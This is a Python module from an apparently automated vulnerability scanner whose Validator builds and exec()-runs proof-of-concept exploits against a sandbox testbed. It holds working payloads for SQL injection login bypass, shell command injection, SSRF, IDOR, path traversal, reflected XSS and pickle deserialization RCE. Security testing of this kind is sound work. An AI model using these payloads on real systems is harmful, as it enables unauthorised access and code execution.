"""Validator — reproduction clean-room sur le testbed live (FR-060..066).

Pour chaque true-positive exploitable, le Validator **génère un script d'exploitation
Python autonome** puis l'**exécute réellement** contre le testbed (le code affiché EST le
code lancé : il est `exec`-uté). Il capture la requête envoyée et la réponse observée, et
ne pose `exploited` que si l'impact phare est directement observé (Constitution VII).
Sortie : un PoC runnable (`runs/<id>/poc/<fp>.py`) + une trace d'exécution (`.json`).
"""
from __future__ import annotations

import json
import os

# Scripts d'exploitation par classe. __BASE__ est remplacé par l'URL réelle du testbed.
# Chaque script est autonome (imports inclus) et pose un dict RESULT.
POC = {
    "CWE-89": '''# PoC — SQL Injection: authentication bypass (CWE-89)
import urllib.request, urllib.parse
BASE = __BASE__
payload = "admin' --"                       # comments out the rest of the SQL query
req = "/login?username=" + urllib.parse.quote(payload) + "&password=n_importe_quoi"
resp = urllib.request.urlopen(BASE + req, timeout=4).read().decode()
RESULT = {"ok": '"ok": true' in resp.lower(), "request": "GET " + req,
          "response": resp[:300],
          "impact": "Authentication bypassed as admin, no valid password needed"}
''',
    "CWE-78": '''# PoC — Command Injection: RCE (CWE-78)
import urllib.request, urllib.parse
BASE = __BASE__
payload = "127.0.0.1; echo FORGE_PWNED"      # grafts a shell command
req = "/admin/ping?host=" + urllib.parse.quote(payload)
resp = urllib.request.urlopen(BASE + req, timeout=4).read().decode()
RESULT = {"ok": "FORGE_PWNED" in resp, "request": "GET " + req, "response": resp[:300],
          "impact": "Injected command executed: output FORGE_PWNED returned by the server"}
''',
    "CWE-918": '''# PoC — SSRF: access to an internal resource (CWE-918)
import urllib.request, urllib.parse
BASE = __BASE__
internal = BASE + "/health"                  # internal URL supplied by the attacker
req = "/imageproxy?url=" + urllib.parse.quote(internal)
resp = urllib.request.urlopen(BASE + req, timeout=4).read().decode()
RESULT = {"ok": "vulnshop" in resp, "request": "GET " + req, "response": resp[:300],
          "impact": "The server fetched an attacker-supplied internal URL"}
''',
    "CWE-639": '''# PoC — IDOR: access to another account data (CWE-639)
import urllib.request
BASE = __BASE__
req = "/profile?id=3"                         # the id of another account (admin)
resp = urllib.request.urlopen(BASE + req, timeout=4).read().decode()
RESULT = {"ok": '"role": "admin"' in resp and "ssn" in resp, "request": "GET " + req,
          "response": resp[:300], "impact": "Another admin profile exposed, including SSN"}
''',
    "CWE-22": '''# PoC — Path traversal: arbitrary file read (CWE-22)
import urllib.request, urllib.parse
BASE = __BASE__
req = "/avatar?file=" + urllib.parse.quote("../db.py")   # escapes the avatars folder
resp = urllib.request.urlopen(BASE + req, timeout=4).read().decode(errors="replace")
RESULT = {"ok": "authenticate" in resp or "SELECT" in resp, "request": "GET " + req,
          "response": resp[:300], "impact": "Source code read outside the allowed folder"}
''',
    "CWE-79": '''# PoC — Reflected XSS (CWE-79)
import urllib.request, urllib.parse
BASE = __BASE__
payload = "<script>alert(1)</script>"
req = "/search?q=" + urllib.parse.quote(payload)
resp = urllib.request.urlopen(BASE + req, timeout=4).read().decode()
RESULT = {"ok": payload in resp, "request": "GET " + req, "response": resp[:300],
          "impact": "The <script> payload is reflected unescaped in the HTML response"}
''',
    "CWE-502": '''# PoC — Unsafe deserialization: RCE via pickle (CWE-502)
import urllib.request, urllib.parse, base64, pickle, subprocess
BASE = __BASE__
class P:                                       # __reduce__ runs at pickle.loads()
    def __reduce__(self):
        return (subprocess.check_output, (["echo", "FORGE_DESER_PWNED"],))
payload = base64.b64encode(pickle.dumps(P())).decode()
req = "/prefs?c=" + urllib.parse.quote(payload)
resp = urllib.request.urlopen(BASE + req, timeout=4).read().decode()
RESULT = {"ok": "FORGE_DESER_PWNED" in resp, "request": "GET /prefs?c=<payload-pickle>",
          "response": resp[:300], "impact": "Code execution via deserialization (observed output)"}
''',
}


def _build_poc(cwe: str, base: str) -> str | None:
    tpl = POC.get(cwe)
    return tpl.replace("__BASE__", repr(base)) if tpl else None


def handle(task, ctx, agent_id) -> list:
    fp = task["payload"]["fp"]
    cwe = task["payload"]["cwe"]
    f = ctx.findings.get(fp)
    if not f or not ctx.testbed_url:
        return []
    ctx.llm.complete(role="validator", instance=agent_id, correlation_id=fp,
                     prompt=f"Génère et exécute un PoC pour {cwe} sur le testbed.",
                     system="Vérificateur clean-room : exécute l'exploit et observe l'impact.")

    code = _build_poc(cwe, ctx.testbed_url)
    if not code:
        return []

    # Exécute RÉELLEMENT le code généré contre le testbed (le code montré = le code lancé).
    g: dict = {}
    try:
        exec(code, g)  # noqa: S102 — code généré par nous, cible = testbed jetable du sandbox
        res = g.get("RESULT", {})
    except Exception as e:  # noqa: BLE001
        res = {"ok": False, "request": "", "response": "", "impact": f"erreur d'exécution: {e}"}

    if res.get("ok"):
        poc_dir = os.path.join(ctx.run_dir, "poc")
        os.makedirs(poc_dir, exist_ok=True)
        py_path = os.path.join(poc_dir, f"{fp}.py")
        header = (f"#!/usr/bin/env python3\n# PoC generated by Forge — {f['title']} ({cwe})\n"
                  f"# Run against the testbed; observed impact below.\n\n")
        with open(py_path, "w", encoding="utf-8") as fh:
            fh.write(header + code)
        with open(os.path.join(poc_dir, f"{fp}.json"), "w", encoding="utf-8") as fh:
            json.dump({"request": res.get("request", ""), "response": res.get("response", ""),
                       "impact": res.get("impact", "")}, fh, ensure_ascii=False)
        ctx.findings.set_exploited(fp, py_path)
    else:
        ctx.events.emit("validate_fail", finding=fp, reason=res.get("impact", "non reproduit"))
    return []
